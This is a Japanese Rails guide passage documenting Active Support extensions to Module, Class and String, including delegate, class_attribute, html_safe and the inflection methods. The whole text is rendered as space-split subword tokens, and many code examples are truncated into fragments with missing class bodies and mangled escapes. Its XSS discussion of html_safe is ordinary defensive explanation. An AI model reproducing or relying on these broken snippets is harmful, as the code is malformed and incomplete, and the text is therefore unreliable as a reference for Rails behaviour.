▁X :: Y :: Z . parent ▁# ▁=> ▁X :: Y
▁ M . parent ▁# ▁=> ▁X :: Y
▁ モジュール が 無 名 または ト ッ プ レベル の場合 、` parent ` は ` Object ` を返します 。
▁WARN ING : ▁` parent _ name ` は 上 の場合 でも ` nil ` を返します 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / module / in tr o spec tion . rb ` です 。
▁#### ▁` parent _ name `
▁` parent _ name ` メソッドは 、 名前 が ネスト した モジュール に対して 実行 でき 、 対応する 定数 を持つ モジュール を返します 。
▁X :: Y :: Z . parent _ name ▁# ▁=> ▁" X :: Y "
▁ M . parent _ name ▁# ▁=> ▁" X :: Y "
▁ モジュール が 無 名 または ト ッ プ レベル の場合 、` parent _ name ` は ` nil ` を返します 。
▁WARN ING : ▁` parent ` は 上 の場合 でも ` Object ` を返します 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / module / in tr o spec tion . rb ` 。
▁#### ▁` parent s `
▁` parent s ` メソッドは 、 レシーバ に対して ` parent ` を 呼び出し 、` Object ` に 到 着 する まで パス を さ か の ぼ ります 。
▁ 連 鎖 した モジュール は 、 階層 の 下 から 上の 順に 配列 として 返 されます 。
▁X :: Y :: Z . parent s ▁# ▁=> ▁[ X :: Y , ▁X , ▁ Object ]
▁ M . parent s ▁# ▁=> ▁[ X :: Y , ▁X , ▁ Object ]
▁### ▁ 定数
▁` local _ const an t s ` メソッドは 、 レシーバ モジュール で 定義された 定数 名 を返します 。
▁X 1 ▁= ▁1
▁X 2 ▁= ▁2
▁ Y 1 ▁= ▁: y 1
▁X 1 ▁= ▁: o ver ri de s _ X 1 _ a b o ve
▁X . local _ const an t s ▁# ▁=> ▁ [: X 1 , ▁: X 2, ▁: Y ]
▁X :: Y . local _ const an t s ▁# ▁=> ▁ [: Y 1 , ▁: X 1 ]
▁ 定数 名 は シンボル として 返 されます 。
▁#### ▁ 正 規 の 定数 名
▁Active ▁Support では この API を 拡 張 し 、 より フル パス に 近 い ( qualified ) 定数 名を 渡 せる ようにしています 。
▁ 新しい メソッドは ` qualified _ const _ de f in ed ?` 、` qualified _ const _ get `、` qualified _ const _ set ` です 。
▁これらの メソッド に 渡す 引数 は 、 レシーバ から の 相 対 的な 修 飾 済み 定数 名 であること が 前 提 となります 。
▁ Object . qualified _ const _ de f in ed ? (" M a th :: P I ") ▁# ▁=> ▁true
▁ Object . qualified _ const _ get (" M a th :: P I ") ▁# ▁=> ▁ 3.1 4 1 59 2 6 5 3 5 8 9 7 9 3
▁ Object . qualified _ const _ set (" M a th :: P h i ", ▁1. 6 18 0 3 4 ) ▁# ▁=> ▁1. 6 18 0 3 4
▁ 修 飾 されていない 、 素 の 定数 名 も 使用できます 。
▁Ma th . qualified _ const _ get (" E ") ▁# ▁=> ▁2 . 7 18 28 18 28 4 59 04 5
▁これらの メソッドは 、 ビルトイン 版 の メソッドと 類 似 しています 。
▁ 特に 、` qualified _ const an t _ de f in ed ?` メソッドは 2 つ目の 引数として 、 述 語 を 先 祖 に 向 って 遡 って 探 す かどうか という フラグ を オプション で 指定できます 。
▁この フラグ は 、 与えられた すべての 定数 について 、 メソッドで パス を 下 る 時 に適用 されます 。
▁以下の 例 で 考 察 してみましょう 。
▁ module ▁ M
▁X ▁= ▁1
▁ module ▁ N
▁class ▁C
▁ include ▁ M
▁` qualified _ const _ de f in ed ?` は 以下のように 動作します 。
▁C :: X ", ▁false ) ▁# ▁=> ▁false
▁C :: X ", ▁true ) ▁# ▁=> ▁true
▁C :: X ") ▁# ▁=> ▁true
▁ 最後の 例 で わかるように 、` const _ de f in ed ?` メソッド と同様に 2 番目の 引数 はデフォルトで true になります 。
▁ ビルトイン メソッドと 一 貫 させる ため 、 相 対 パス 以外 は 利用 できません 。
▁`: : M a th :: P I ` のような 絶 対 定数 名 を指定すると ` Name Error ` が発生し ます 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / module / qualified _ const . rb ` です 。
▁### ▁ 到 達 可能
▁ 名前 を持つ モジュール は 、 対応する 定数 に保存 されている 場合に 到 達 可能 ▁( r each able ) ▁ となります 。
▁これは 、 定数 を経由して モジュール オブジェクト に 到 達 できる という 意味 です 。
▁これは 通常の 動作 です 。 " M " という モジュール がある と すると 、` M ` という 定数 が存在し 、 そこ に モジュール が 保 持 されます 。
▁ M . r each able ?
▁しかし 、 定数 と モジュール が 実 質 上 切り 離 される と 、 その モジュール オブジェクトは 到 着 不 能 ▁( un r each able ) ▁ になります 。
▁ or ph an ▁= ▁ Object . s end (: remove _ const , ▁: M )
▁# ▁この モジュール は 孤 立 している が 、 まだ 無 名 では ない
▁ or ph an . name ▁# ▁=> ▁" M "
▁# ▁ 定数 M は 既に 存 在 して ないので 、 定数 M を経由して 到 達 できない
▁ or ph an . r each able ?
▁# ▁" M " という名前の モジュール を 再度 定義 する
▁# ▁ 定数 M が 再度 存 在 し 、 モジュール オブジェクト " M " を保持し ている が
▁# ▁ 元 と 異なる 新しい インスタンス である
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / module / r each able . rb ` です 。
▁### ▁ 無 名 モジュール
▁ モジュール は 名前 を持つ ことも 、 無 名 で いる こともできます 。
▁ M . name ▁# ▁=> ▁" M "
▁ N ▁= ▁ M o d ul e . new
▁ N . name ▁# ▁=> ▁" N "
▁ M o d ul e . new . name ▁# ▁=> ▁nil
▁ 述 語 ` an on y m o us ?` を使用して 、 モジュール に 名前 がある かどうかを チェック できます 。
▁ M o d ul e . new . an on y m o us ?
▁ 到 達 不 能 ▁( un r each able ) ▁ であっても 、 必ず し も 無 名 ▁( an on y m o us ) ▁ になる とは 限 り ません 。
▁ m ▁= ▁ Object . s end (: remove _ const , ▁: M )
▁ m . r each able ?
▁ m . an on y m o us ?
▁ 逆 に 無 名 モジュール は 、 定義 上 必ず 到 達 不 能 になります 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / module / an on y m o us . rb ` です 。
▁### ▁ メソッド 委 譲
▁` de le g at e ` マクロ を使用すると 、 メソッド を簡単に 委 譲 できます 。
▁ ある アプリケーションの ` User ` モデルに ログイン 情報 があり 、 それ に 関連する 名前 などの 情報 は ` Pro file ` モデルに あるとします 。
▁has _ one ▁: profile
▁この 構成 では 、` user . profile . name ` のように プロファイル 越 し に ユーザー名 を 取得 する ことになります 。 これらの 属性 に 直接 アクセス できた ら もっと 便 利 になる ことでしょう 。
▁ profile . name
▁` de le g at e ` を使用すれば できるようになります 。
▁ de le g at e ▁: name , ▁to : ▁: profile
▁この 方法 なら 記述 が 短 く て 済み 、 意味 も は っ き り します 。
▁ 使用する メソッドは 対象 クラス 内で public である 必要があります 。
▁` de le g at e ` マクロ には 複数の メソッドを 指定できます 。
▁ de le g at e ▁: name , ▁: age , ▁: address , ▁: t w it ter , ▁to : ▁: profile
▁`: to ` オプション が 文字列 に変換 される と 、 メソッドの 委 譲 先 となる オブジェクト に 評価 される 式 になります 。
▁ 通常 は 文字列 または シンボル になります 。
▁ そのような 式 は 、 レシーバ の コンテキスト で 評価 されます 。
▁# ▁Rails 定数 を 委 譲 する
▁ de le g at e ▁: logger , ▁to : ▁: Rails
▁# ▁ レシーバ の クラス に 委 譲 する
▁ de le g at e ▁: table _ name , ▁to : ▁: class
▁WARN ING : ▁`: prefix ` オプション が ` true ` の場合 、 一 般 性 が 低 下 します ▁( 後 述 )。
▁ 委 譲 時に ` No M e th o d Error ` が発生し て 対象 が ` nil ` の場合 、 例外が発生します 。
▁`: allow _ nil ` オプション を使用すると 、 例外 の 代りに ` nil ` を返す ように することができます 。
▁ de le g at e ▁: name , ▁to : ▁: profile , ▁ allow _ nil : ▁true
▁`: allow _ nil ` を指定すると 、 ユーザーの プロファイル がない 場合に ` user . name ` 呼び出し は ` nil ` を返します 。
▁`: prefix ` オプションを true に すると 、 生成された メソッド の名前 に プレフィックス を追加します 。
▁これは 、 たとえば より よい 名前 に したい場合 に 便利です 。
▁ de le g at e ▁: s tree t , ▁to : ▁: address , ▁ prefix : ▁true
▁上の 例 では 、` s tree t ` ではなく ` address _ s tree t ` が 生成されます 。
▁WARN ING : ▁ この場合 、 生成される メソッド の名前 では 、 対象 となる オブジェクト 名 と メソッド 名 が使用されます 。 `: to ` オプション で 指定 する のは メソッド 名 で なければなりません 。
▁ プレフィックス を カスタマイズ することもできます 。
▁ de le g at e ▁: size , ▁to : ▁: attachment , ▁ prefix : ▁: a v at ar
▁上の 例 では 、 マクロ によって ` size ` の代わりに ` a v at ar _ size ` が 生成されます 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / module / de le g ation . rb ` です 。
▁### ▁ メソッドの 再 定義
▁` de f in e _ method ` を使用して メソッドを 再 定義 する 必要がある が 、 その 名前 が 既に ある かどうか が わ から ない と ことがあります 。
▁ 有効な 名前 が 既に あ れば 警 告 が表示されます 。
▁ 警 告 が表示され ても 大 した ことはありません が 、 邪 魔 に 思える こともあります 。
▁` re de f in e _ method ` メソッド を使用すれば 、 必要に応じて 既存の メソッドが 削除 される ので 、 このような 警 告 表示 を 抑 制 できます 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / module / remove _ method . rb ` です 。
▁` Class ` の 拡 張
▁### ▁ Class 属性
▁#### ▁` class _ attribute `
▁` class _ attribute ` メソッドは 、 1 つ 以上 の 継 承 可能な クラスの 属性を 宣言 します 。 その クラス 属性 は 、 その 下 の どの 階層 でも 上 書き 可能です 。
▁class _ attribute ▁: x
▁class ▁B ▁< ▁A ; ▁end
▁class ▁C ▁< ▁B ; ▁end
▁A . x ▁= ▁: a
▁B . x ▁# ▁=> ▁: a
▁C . x ▁# ▁=> ▁: a
▁B . x ▁= ▁: b
▁A . x ▁# ▁=> ▁: a
▁C . x ▁# ▁=> ▁: b
▁C . x ▁= ▁: c
▁B . x ▁# ▁=> ▁: b
▁たとえば 、` Action Mailer :: Base ` に 以下の 定義 が あるとします 。
▁class _ attribute ▁: default _ params
▁self . default _ params ▁= ▁ {
▁ m im e _ version : ▁" 1 . 0 ",
▁ cha r set : ▁" UT F - 8 ",
▁ content _ type : ▁" text / plain ",
▁ part s _ order : ▁[ ▁" text / plain ", ▁" text / en ri ch ed ", ▁" text / html " ▁ ]
▁ } . free z e
▁これらの 属性 は インスタンス の レベル で アクセス または オーバーライド できます 。
▁A . x ▁= ▁1
▁a 1 ▁= ▁A . new
▁a 2 ▁= ▁A . new
▁a 2 . x ▁= ▁2
▁a 1 . x ▁# ▁=> ▁1 ▁( A が 使われ る )
▁a 2 . x ▁# ▁=> ▁2 ▁( a 2 で オーバーライド される )
▁`: instance _ write r ` を ` false ` に 設定 すれば 、 write r インスタンス メソッドは 生成 されません 。
▁ module ▁ActiveRecord
▁class _ attribute ▁: table _ name _ prefix , ▁ instance _ write r : ▁false
▁self . table _ name _ prefix ▁= ▁" "
▁上の オプションは 、 モデルの 属性 設定 時に マ ス ア サ イン メ ン ト を 防止 するのに 便利です 。
▁`: instance _ reader ` を ` false ` に 設定 すれば 、 reader インスタンス メソッドは 生成 されません 。
▁class _ attribute ▁: x , ▁ instance _ reader : ▁false
▁A . new . x ▁= ▁1 ▁# ▁ No M e th o d Error
▁ 利 便 性 のために 、` class _ attribute ` は 、 インスタンス の reader が 返す もの を 「 二 重 否 定 」 する インスタンス 述 語 も 定義 されます 。
▁上の 例 の場合 、` x ?` となります 。
▁`: instance _ reader ` が ` false ` の場合 、 インスタンス 述 語 は reader メソッド と同様に ` No M e th o d Error ` を返します 。
▁ インスタンス 述 語 が 不要な 場合 、` instance _ pre d i cat e : ▁false ` を 指定 すれば 定義 され なくなります 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / class / attribute . rb ` です 。
▁#### ▁` c attr _ reader `、` c attr _ write r `、` c attr _ accessor `
▁` c attr _ reader `、` c attr _ write r `、` c attr _ accessor ` マクロ は 、` attr _ * ` と似ています が 、 クラス 用 である 点が 異なります 。
▁これらの メソッドは 、 クラス 変数 を ` nil ` に設定し ▁( クラス 変数 が 既に ある 場合 を 除 く ) 、 対応する クラス メソッドを 生成 して アクセス できるようにします 。
▁class ▁ M y sql A d a p ter ▁< ▁A b s tr a ct A d a p ter
▁# ▁@ @ e m ul at e _ boolean s にアクセス できる クラス メソッド を生成する
▁c attr _ accessor ▁: e m ul at e _ boolean s
▁self . e m ul at e _ boolean s ▁= ▁true
▁ 利 便 性 の ため 、 このとき インスタンス メソッド も 生成されます が 、 これらは 実際には クラス 属性 の 単なる プロキシ です 。
▁従って 、 インスタンス から クラス 属性 を変更する ことは できます が 、` class _ attribute ` で 行 わ れる ように 上 書き する ことはできません ( 上 記 参 照 )。
▁たとえば 以下の 場合 、
▁c attr _ accessor ▁: field _ error _ pro c
▁@ @ field _ error _ pro c ▁= ▁ Proc . new { ▁ ... ▁ }
▁ ビューで ` field _ error _ pro c ` にアクセス できます 。
▁ 同様に 、` c attr _ * ` に ブロック を渡して 属性 に デフォルト値 を設定する こともできます 。
▁# ▁@ @ e m ul at e _ boolean s にアクセス して デフォルト値 を true にする クラス メソッドを 生成
▁c attr _ accessor (: e m ul at e _ boolean s ) ▁ { ▁true ▁ }
▁`: instance _ reader ` オプションを ` false ` に設定する ことで 、 reader インスタンス メソッド が生成され ないように できます 。 同様に 、`: instance _ write r ` オプションを ` false ` に設定する ことで 、 write r インスタンス メソッド が生成され ないように できます 。
▁`: instance _ accessor ` オプションを ` false ` に 設定 すれば 、 どちら の インスタンス メソッド も 生成 されません 。
▁ いずれ の場合 も 、 指定 できる 値 は ` false ` のみ です 。 ' nil ' など 他の false 値 は 指定 できません 。
▁ module ▁A
▁class ▁B
▁# ▁ first _ name インスタンス reader は 生成 され ない
▁c attr _ accessor ▁: first _ name , ▁ instance _ reader : ▁false
▁# ▁ last _ name = ▁ インスタンス write r は 生成 され ない
▁c attr _ accessor ▁: last _ name , ▁ instance _ write r : ▁false
▁# ▁ s ur name インスタンス reader も s ur name = ▁ インスタンス write r も 生成 され ない
▁c attr _ accessor ▁: s ur name , ▁ instance _ accessor : ▁false
▁`: instance _ accessor ` を ` false ` に設定する と 、 モデルの 属性 設定 時に マ ス ア サ イン メ ン ト を 防止 するのに 便利です 。
▁### ▁ サブ クラス と 子 孫
▁#### ▁` sub classes `
▁` sub classes ` メソッドは レシーバ の サブ クラス を返します 。
▁class ▁C ; ▁end
▁C . sub classes ▁# ▁=> ▁[ ]
▁class ▁B ▁< ▁C ; ▁end
▁C . sub classes ▁# ▁=> ▁[ B ]
▁class ▁A ▁< ▁B ; ▁end
▁class ▁D ▁< ▁C ; ▁end
▁C . sub classes ▁# ▁=> ▁[ B , ▁D ]
▁ 返される クラスの 順序 は 一 定 ではありません 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / class / sub classes . rb ` です 。
▁#### ▁` de sc end an t s `
▁` de sc end an t s ` メソッドは 、 その レシーバ より 下 位 にある すべての クラス を返します 。
▁C . de sc end an t s ▁# ▁=> ▁[ ]
▁C . de sc end an t s ▁# ▁=> ▁[ B ]
▁C . de sc end an t s ▁# ▁=> ▁[ B , ▁A ]
▁C . de sc end an t s ▁# ▁=> ▁[ B , ▁A , ▁D ]
▁` String ` の 拡 張
▁### ▁ 安全 な 出力
▁#### ▁ 開発 の 動 機
▁ HTML テンプレート に データを 挿 入 する方法 は 、 き わ め て 慎 重 に 設計 する必要があります 。
▁たとえば 、 `@ re view . title ` を 何 の 工 夫 も なく そのまま HTML に 式 展開 する ようなこと は 絶 対 に すべき ではありません 。
▁ も し この レ ビュー の タイトル が 仮 に " F la n a g an ▁ & ▁Ma t z ▁ r ul es ! " だと した ら 、 出力 は w e ll - form ed になり ません 。 w e ll - form ed に するには 、 " & am p ; am p ; " のように エスケープ し なければなりません 。
▁さらに 、 ユーザーが レ ビュー の タイトル に 細 工 を して 、 悪意のある HTML を タイトル に含め れば 、 巨 大 な セキュリティ ホ ー ル になる こと す ら あります 。
▁この リ ス ク の詳細については 、[ セキュリティ ガイド ]( security . html # ク ロ ス サイト ス ク リ プ テ ィ ング - x s s ) の ク ロ ス サイト ス ク リ プ テ ィ ング の 節 を参照してください 。
▁#### ▁ 安全 な 文字列
▁Active ▁Support には 「 ( html 的に ) ▁ 安全 な 文字列 」 という 概念 があります 。
▁ 安全 な 文字列 とは 、 HTML に そのまま 挿 入 しても 問題 がない という マーク が 付け られ ている 文字列 です 。
▁ マ ー キ ング さ え され ていれば 、「 実際に エスケープ されている かどうか に か か わ らず 」 その 文字列 は 信 頼 されます 。
▁ 文字列 はデフォルトで は ▁ _ un safe _ ▁ と マーク されます 。
▁" ". html _ safe ?
▁ 与えられた 文字列 に ` html _ safe ` メソッドを 適 用 することで 、 安全 な 文字列 を得る ことができます 。
▁ s ▁= ▁" ". html _ safe
▁ s . html _ safe ?
▁ここで 注意 し なければならない のは 、` html _ safe ` メソッド それ 自体 は 何 ら エスケープ を 行 な っ ていない ということです 。 安全 である と マ ー キ ング している に 過 ぎ ません 。
▁ s ▁= ▁" < script > ... </ script > ". html _ safe
▁ s ▁# ▁=> ▁" < script > ... </ script > "
▁従って 、 特定の 文字列 に対して ` html _ safe ` メソッド を呼び出す 際に は 、 その 文字列 が 本当に 安全 である ことを確認する 義 務 があります 。
▁ 安全 である と 宣言 された 文字列 に 対 し 、 安全 でない 文字列を ` con cat ` / ` < < ` または ` + ` を使用して 破 壊 的に 追加 すると 、 結果 は 安全 な 文字列 になります 。
▁ 安全 でない 引数 は 追加 時に エスケープ されます 。
▁" ". html _ safe ▁+ ▁" < " ▁# ▁=> ▁" & lt ; "
▁ 安全 な 引数 であれば 、 ( エスケープ な し で ) 直接 追加 されます 。
▁" ". html _ safe ▁+ ▁" < ". html _ safe ▁# ▁=> ▁" < "
▁ 基本的に これらの メソッドは 、 通常の ビュー では 使用 しないでください 。
▁ 現在の Rails の ビュー では 、 安全 でない 値 は自動的に エスケープ される ためです 。
▁<%= ▁@ re view . title ▁%> ▁<% # ▁ 必要に応じて エスケープ される ので 問題 な し ▁%>
▁ 何らかの 理由 で 、 エスケープ されていない 文字列を 挿 入 したい場合は 、` html _ safe ` を 呼 ぶ の ではなく 、` raw ` ヘルパー を使用 するようにしてください 。
▁<%= ▁ raw ▁@ c m s . current _ template ▁%> ▁<% # ▁@ c m s . current _ template を そのまま 挿 入 ▁%>
▁ あるいは 、` raw ` と 同 等 の ` <%= = ` を使用します 。
▁<%= = ▁@ c m s . current _ template ▁%> ▁<% # ▁@ c m s . current _ template を そのまま 挿 入 ▁%>
▁` raw ` ヘルパーは 、 内部で ` html _ safe ` を呼び出します 。
▁def ▁ raw ( string i sh )
▁ string i sh . to _ s . html _ safe
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / string / out put _ safe t y . rb ` です 。
▁#### ▁ 各 種 変 換
▁ 経験 上 、 上 で説明した ような 連 結 ▁( con cat en ation ) ▁ 操作 を 除 き 、 どんな メソッド でも 潜 在 的に は 文字列を 安全 でない もの に変換 してしまう 可能性 がある ことに 常に 注意 を 払 う 必要があります 。
▁ そのような メソッド には ` downcase `、` g sub `、` strip `、` ch o m p `、` underscore ` など があります 。
▁` g sub !` のような 破 壊 的な 変 換 を行なう メソッドを使用すると 、 レシーバ 自体 が 安全 で なくなります 。
▁INFO : ▁ こう した メソッド を実行すると 、 実際 に変換 が 行われた かどうか に か か わ らず 、 安全 を表す ビ ッ ト は 常に オフ になります 。
▁#### ▁ 変 換 と 強 制
▁ 安全 な 文字列 に対して ` to _ s ` を実行し た場合 は 、 安全 な 文字列 が返されます 。 しかし 、` to _ s tr ` による 強 制 的な 変 換 を実行し た場合 には 安全 でない 文字列 が返されます 。
▁#### ▁ コピー
▁ 安全 な 文字列 に対して ` dup ` または ` c l one ` を実行し た場合 は 、 安全 な 文字列 が 生成されます 。
▁### ▁` remove `
▁` remove ` メソッド を実行すると 、 すべての 該 当 パターン が 削除 されます 。
▁ Hello ▁ W or l d "
▁このメソッド には 破 壊 的な バージョンの ` String # remove !` もあります 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / string / filter s . rb ` です 。
▁### ▁` s q u i sh `
▁` s q u i sh ` メソッドは 、 冒 頭 と 末尾 の ホ ワ イ ト スペース を 除 去 し 、 連 続 した ホ ワ イ ト スペース を 1 つ に 減 ら します 。
▁" ▁\ n ▁ foo \ n \ r ▁\ t ▁ bar ▁\ n ". s q u i sh ▁# ▁=> ▁" foo ▁ bar "
▁このメソッド には 破 壊 的な バージョンの ` String # s q u i sh !` もあります 。
▁このメソッド では 、 A S C I I と U n i code の ホ ワ イ ト スペース を 扱 え ます 。
▁### ▁` truncate `
▁` truncate ` メソッドは 、 指定された ` length ` に まで 長さ を 切り 詰 め た レシーバ の コピー を返します 。
▁" O h ▁ de ar ! ▁ O h ▁ de ar !
▁I ▁ sh all ▁be ▁ la te ! ". truncate ( 20 )
▁# ▁=> ▁" O h ▁ de ar !
▁ O h ▁ de ar ! ... "
▁`: o m is s ion ` オプション を指定する ことで 、 省略 文字 ▁ (...) ▁ を カスタマイズ することもできます 。
▁I ▁ sh all ▁be ▁ la te ! ". truncate ( 20 , ▁ o m is s ion : ▁' & h e ll ip ; ')
▁ O h ▁ & h e ll ip ; "
▁ 文字列 の 切り 詰 め では 、 省略 文字列 の 長さ も 加 味 される ことに 特に ご注意ください 。
▁`: s e p ar at or ` を指定する ことで 、 自 然 な 区切 り 位 置 で 切り 詰 め ることができます 。
▁I ▁ sh all ▁be ▁ la te ! ". truncate ( 18 )
▁ O h ▁ de a ... "
▁I ▁ sh all ▁be ▁ la te ! ". truncate ( 18 , ▁ s e p ar at or : ▁' ▁ ')
▁ O h ... "
▁`: s e p ar at or ` オプション で 正規表現 を使用する こともできます 。
▁I ▁ sh all ▁be ▁ la te ! ". truncate ( 18 , ▁ s e p ar at or : ▁ / \ s / )
▁上の 例 では 、 " de ar " という 文字 で 切り 落 と され そう になる ところ を 、`: s e p ar at or ` によって 防 い で います 。
▁### ▁` truncate _ word s `
▁` truncate _ word s ` メソッドは 、 指定された ワ ー ド 数 から 後 ろ を き り お と した レシーバ の コピー を返します 。
▁I ▁ sh all ▁be ▁ la te ! ". truncate _ word s ( 4 )
▁I ▁ sh all ▁be ▁ la te ! ". truncate _ word s ( 4 , ▁ o m is s ion : ▁' & h e ll ip ; ')
▁ O h ▁ de ar !
▁I ▁ sh all ▁be ▁ la te ! ". truncate _ word s ( 3, ▁ s e p ar at or : ▁' ! ')
▁ O h ▁ de ar !
▁I ▁ sh all ▁be ▁ la te ... "
▁I ▁ sh all ▁be ▁ la te ! ". truncate _ word s ( 4 , ▁ s e p ar at or : ▁ / \ s / )
▁### ▁` in q u ir y `
▁` in q u ir y ` は 、 文字列を ` String In q u ir er ` オブジェクト に変換 します 。 この オブジェクト を使用すると 、 等 しい かどうかを より ス マ ート に チェック できます 。
▁" production ". in q u ir y . production ?
▁" active ". in q u ir y . in active ?
▁### ▁` start s _ with ?` と ` end s _ with ?`
▁Active ▁Support では 、` String # start _ with ?` と ` String # end _ with ?` を 英語 的に 自 然 な 三 人 称 ( start s 、 end s ) に した 別 名 も 定義 して あります 。
▁f ") ▁# ▁=> ▁true
▁ o ") ▁# ▁=> ▁true
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / string / start s _ end s _ with . rb ` です 。
▁### ▁` strip _ her e doc `
▁` strip _ her e doc ` メソッドは 、 ヒ ア ドキュメント の インデント を 除 去 します 。
▁ 以下 に 例 を示します 。
▁if ▁ options [: us age ]
▁ put s ▁< < - U S A G E . strip _ her e doc
▁This ▁ command ▁do es ▁ s u ch ▁and ▁ s u ch .
▁Support ed ▁ options ▁are :
▁- h ▁This ▁ message
▁ ...
▁ U S A G E
▁この U S A G E メッセージ は 左 寄 せ で 表示 されます 。
▁ 技術 的に は 、 インデント が 一 番 浅 い 行 を探し て 、 その インデント 分 だけ 行 頭 の ホ ワ イ ト スペース を 全体 から 削除 する という 操作 を行って います 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / string / strip . rb ` です 。
▁### ▁` in d ent `
▁このメソッドは 、 レシーバ の 行 に インデント を 与え ます 。
▁< < E OS . in d ent (2)
▁def ▁ some _ method
▁ some _ code
▁def ▁ some _ method
▁ some _ code
▁2 つ め の 引数 ` in d ent _ string ` は 、 インデント に 使用する 文字列 を指定します 。
▁デフォルトは ` nil ` であり 、 この場合 最初に インデント されている 行 の インデント 文字 を参照 して そこ から インデント 文字 を 推測 します 。 インデント が まったく ない場合は スペース 1 つ を使用します 。
▁" ▁ foo ". in d ent (2) ▁# ▁=> ▁" ▁ foo "
▁" foo \ n \ t \ t bar ". in d ent (2) ▁# ▁=> ▁" \ t \ t foo \ n \ t \ t \ t \ t bar "
▁" foo ". in d ent ( 2, ▁" \ t ") ▁# ▁=> ▁" \ t \ t foo "
▁` in d ent _ string ` には 1 文字 の スペース または タブ を使用する のが普通です が 、 どんな 文字 でも 使用できます 。
▁3 つ目の 引数 ` in d ent _ empty _ line s ` は 、 空 行 も インデント する かどうか を指定する フラグ です 。
▁デフォルトは false です 。
▁" foo \ n \ n bar ". in d ent (2) ▁# ▁=> ▁" ▁ foo \ n \ n ▁ bar "
▁" foo \ n \ n bar ". in d ent ( 2, ▁nil , ▁true ) ▁# ▁=> ▁" ▁ foo \ n ▁\ n ▁ bar "
▁` in d ent !` メソッドは インデント を その 場 で ▁( 破 壊 的に ) ▁ 行います 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / string / in d ent . rb ` です 。
▁### ▁A c c ess
▁#### ▁` at ( p o s i tion ) `
▁ 対象 となる 文字列 のうち 、` p o s i tion ` で 指定された 位 置 にある 文字 を返します 。
▁" hello ". at ( 0 ) ▁# ▁=> ▁" h "
▁" hello ". at ( 4 ) ▁# ▁=> ▁" o "
▁" hello ". at ( - 1 ) ▁# ▁=> ▁" o "
▁" hello ". at ( 10 ) ▁# ▁=> ▁nil
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / string / access . rb ` です 。
▁#### ▁` from ( p o s i tion ) `
▁ 文字列 のうち 、` p o s i tion ` で 指定された 位 置 から 始 ま る 部分 文字列 を返します 。
▁" hello ". from ( 0 ) ▁# ▁=> ▁" hello "
▁" hello ". from (2) ▁# ▁=> ▁" ll o "
▁" hello ". from ( - 2 ) ▁# ▁=> ▁" lo "
▁#### ▁` to ( p o s i tion ) `
▁ 文字列 のうち 、` p o s i tion ` で 指定された 位 置 を 終 端 と する 部分 文字列 を返します 。
▁" hello ". to ( 0 ) ▁# ▁=> ▁" h "
▁" hello ". to (2) ▁# ▁=> ▁" h e l "
▁" hello ". to ( - 2 ) ▁# ▁=> ▁" h e ll "
▁" hello ". to ( 10 ) ▁# ▁=> ▁" hello "
▁#### ▁` first ( limit ▁= ▁1 ) `
▁` s tr . first ( n ) ` という 呼び出し は 、` n ` ▁ > ▁0 ▁ のとき ` s tr . to ( n - 1 ) ` と 等 価 です 。 ` n ` ▁= = ▁0 の場合は 空 文字列 を返します 。
▁#### ▁` last ( limit ▁= ▁1 ) `
▁### ▁ 活用 形
▁#### ▁` pluralize `
▁` pluralize ` メソッドは 、 レシーバ を 「 複数形 」 にしたもの を返します 。
▁" table ". pluralize ▁# ▁=> ▁" table s "
▁" ruby ". pluralize ▁# ▁=> ▁" r ub ies "
▁" equ ip m ent ". pluralize ▁# ▁=> ▁" equ ip m ent "
▁上の 例 でも 示 した ように 、 Active ▁Support は 不 規 則 な 複数形 や 非 可 算 名 詞 について ある程度 知 っています 。
▁` config / initializers / in f le ct ions . rb ` にある ビルトイン の ルール は 拡 張 可能です 。
▁この ファイルは ` rails ` コマンドで 拡 張 可能 であり 、 方法は コメント に 示 されています 。
▁` pluralize ` メソッド では オプション で ` count ` パラメータ を使用できます 。
▁` count ` が それ以外の 値 の場合は 複数形 を返します ( 訳 注 : ▁ 英語 では 個 数 が ゼ ロ や 小 数 の場合は 複数形 で 表 されます )。
▁" d u de ". pluralize ( 0 ) ▁# ▁=> ▁" d u de s "
▁" d u de ". pluralize (1) ▁# ▁=> ▁" d u de "
▁" d u de ". pluralize (2) ▁# ▁=> ▁" d u de s "
▁Active ▁Record では 、 モデル名 に対応する デフォルトの テーブル 名を 求 め る ときに このメソッド を使用しています 。
▁# ▁ active _ record / model _ s ch e ma . rb
▁def ▁ un de c or at ed _ table _ name ( class _ name ▁= ▁ base _ class . name )
▁ table _ name ▁= ▁class _ name . to _ s . de mod ul ize . underscore
▁ pluralize _ table _ name s ▁ ?
▁ table _ name . pluralize ▁: ▁ table _ name
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / string / in f le ct ions . rb ` です 。
▁#### ▁` s ing ul ar ize `
▁` pluralize ` と 逆 の動作 です 。
▁" table s ". s ing ul ar ize ▁# ▁=> ▁" table "
▁" r ub ies ". s ing ul ar ize ▁# ▁=> ▁" ruby "
▁" equ ip m ent ". s ing ul ar ize ▁# ▁=> ▁" equ ip m ent "
▁Rails の 関連付け ▁( association ) ▁ では 、 関連付けられた クラス に デフォルトで 対応する 名前 を 求 め る 時に このメソッド が使用されます 。
▁# ▁ active _ record / ref le c tion . rb
▁def ▁ de r ive _ class _ name
▁class _ name ▁= ▁name . to _ s . camelize
▁class _ name ▁= ▁class _ name . s ing ul ar ize ▁if ▁ collection ?
▁class _ name
▁#### ▁` camelize `
▁` camelize ` メソッドは 、 レシーバ を キ ャ メ ル ケース ▁( 冒 頭 を 大文字 に した 単 語 を スペース な し で 連 結 した 語 ) ▁ にしたもの を返します 。
▁" product ". camelize ▁# ▁=> ▁" Product "
